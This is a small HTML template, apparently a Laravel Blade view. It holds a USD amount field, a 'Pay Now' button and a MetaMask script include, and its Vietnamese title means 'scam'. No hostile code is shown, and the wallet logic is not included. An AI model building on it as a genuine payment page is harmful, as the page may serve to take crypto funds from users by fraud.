<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <base href="{{ asset('') }}">
    <title>Lừa đảo</title>
</head>
<body>
    <input min="0" type="text" name="amount" id="amount" placeholder="Nhập số tiền vào giá trị USD">
    <button type="button" onclick="startProcess()">Pay Now</button>

    <script src="vendor/jquery/dist/jquery.min.js"></script>
    <script src="js/frontend/metamask.js"></script>
</body>
</html>